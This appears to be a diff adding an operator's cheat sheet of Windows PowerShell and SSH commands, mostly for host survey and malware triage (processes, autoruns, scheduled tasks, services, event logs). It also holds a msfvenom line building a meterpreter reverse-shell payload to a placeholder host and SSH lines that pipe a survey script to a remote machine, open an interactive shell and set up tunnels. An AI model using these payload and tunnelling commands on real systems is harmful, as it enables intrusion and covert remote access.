@@ -1,0 +1,73 @@
+Windows pastable commands
+
+#################### Ping Sweep #####################
+1..20 | % {"192.168.1.$($_): $(Test-Connection -count 1 -comp 192.168.1.$($_) -quiet)"}								#powershell
+
+#################### Windows Payload ###############
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=443 -f exe > payload_exe
+
+
+#################### Malware Traige ####################
+gwmi win32_process | select-object processid, parentprocessid, commandline | format-table -autosize						# What is the parent process?
+get-authenticodesignature <cmd path>														# Is the process signed
+netstat -ano																	# Is it network aware									#Is it network aware?
+get-process -id <pid> | select -expand modules													# lists all dlls for a give process
+get-childitem <path> | Select-Object name, CreationTime, LastWriteTime, LastAccessTime								# lists time stamps on a file, When was it writen to disk?
+
+Get-ChildItem -path C:\ -recurse -force -ea silentlycontinue | ? { $_.lastwritetime -gt (get-date "04-04-2014 01:00AM") -AND $_.lastwritetime -lt (get-date "04-04-2014 11:59PM")}	#search for files based on time
+
+Get-FileHash <file> -Algorithm MD5																			#Hash the file
+
+Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Run
+Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce
+Get-ItemProperty “HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon”
+Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
+Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce
+Get-ItemProperty “HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon”
+at
+schtasks /query /V /FO list
+
+$tasks = schtasks.exe /query /v /fo csv | ConvertFrom-Csv; $tasks | where-object {$_.'Scheduled Task State' -eq "Enabled"} | select-object TaskName, 'Task To Run'
+
+Get-wmiobject win32_service | where-object { $_.StartMode –eq ‘Auto’ } | format-list Name, DisplayName, PathName
+
+
+#################### Mando ####################
+get-date
+Gwmi Win32_OperatingSystem | Select-Object Caption, InstallDate, ServicePackMajorVersion, OSArchitecture, BootDevice,  BuildNumber, CSName | FL
+gwmi win32_process | select-object processid, parentprocessid, commandline | format-table -autosize
+Get-Service | where-object { $_.Status –eq ‘running’ }
+Get-WmiObject –Class Win32_NetworkAdapterConfiguration | where-object { $_.IPAddress} | Format-Table
+gwmi win32_networkadapterconfiguration -Filter 'ipenabled = "true"'
+arp -a
+netsh advfirewall firewall show rule name=all 
+get-winevent @{logname='application','security','system';starttime=[datetime]::today} | select logname, timecreated, id, message | formate-table -autosize
+get-itemproperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update\Results\Detect" | Select-Object lastsuccesstime			#last time windows updated
+get-itemproperty "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment"										# Windows Env variables
+get-itemproperty "HKCU:\network\*"																# list shares
+auditpol /get /catagory:*																	#lists audit polocies
+Drivers
+
+Get-ChildItem -path C:\Windows\temp
+
+
+#################### PSP ####################
+“windefend” | get-service
+get-childitem -path registry::'HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\uninstall'
+get-itemproperty -path registry::'HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\uninstall\############'
+
+
+
+#################### Exit off Box ####################
+Get-ChildItem –Path C:\ -recurse -force -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime –ge (Get-Date).AddMinutes(-120) }
+get-childitem -path c:\windows\prefetch
+gwmi win32_process | select-object processid, parentprocessid, commandline | format-table -autosize
+netstat -ano
+
+
+
+#################### SSH Connections ####################
+./survey.sh | ssh -v -x -M -S /tmp/@r user@1.1.1.1 > survey.out
+ssh -v -x -O forward -S /tmp/@r user@1.1.1.1 /bin/bash -i
+ssh -v -x -O forward -S /tmp/@r 127.0.0.1@fake -L80:2.2.2.2:80
+ssh -v -x -O forward -S /tmp/@r 127.0.0.1@fake -R 443:127.0.0.1:443
